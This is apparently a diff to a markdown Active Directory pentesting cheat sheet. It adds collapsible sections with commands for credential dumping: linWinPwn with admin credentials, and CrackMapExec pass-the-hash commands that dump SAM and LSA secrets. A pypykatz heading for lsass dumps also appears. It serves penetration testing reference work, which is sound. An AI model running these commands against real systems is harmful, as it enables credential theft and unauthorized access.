@@ -308,6 +308,9 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
 </details> 
   
 # Credential dumping
+<details>
+  <summary> linWinPwn </summary> 
+  
 ### With administrator Account (using password, NTLM hash or Kerberos ticket)
 - All of the "Standard User" checks
 - Module pwd_dump
@@ -319,6 +322,22 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
 ```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> or <hash_LM:NT]> or <kerbticket[./krb5cc_ticket]> -o <output_dir>
 ```
+</details> 
+  
+<details>
+  <summary> CrackMapExec local authenitcation </summary> 
+  
+  ### Dump SAM on local computer
+  ```bash
+  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --sam
+  ```
+  
+   ### Dump LSA on local computer
+  ```bash
+  sudo crackmapexec smb <target_IP> -u <username> -H <hash_NT]> --local-auth --lsa
+  ```
+</details> 
+  
 ## pypykatz
 ### Examine lsass dump
 ```bash
